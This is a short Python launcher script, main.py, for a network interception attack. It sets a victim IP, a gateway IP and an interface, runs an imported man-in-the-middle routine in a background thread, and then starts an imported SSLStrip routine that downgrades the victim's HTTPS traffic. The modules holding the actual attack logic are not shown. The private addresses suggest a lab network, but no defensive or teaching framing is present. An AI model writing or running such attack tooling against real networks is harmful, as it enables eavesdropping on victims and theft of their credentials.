# main.py

from mitm import start_mitm
from strip import start_sslstrip
import threading

victim_ip = "192.168.31.132"
gateway_ip = "192.168.31.1"
interface = "eth0"

# Start MITM in one thread
threading.Thread(target=start_mitm, args=(victim_ip, gateway_ip, interface), daemon=True).start()

# Start SSLStrip
start_sslstrip()
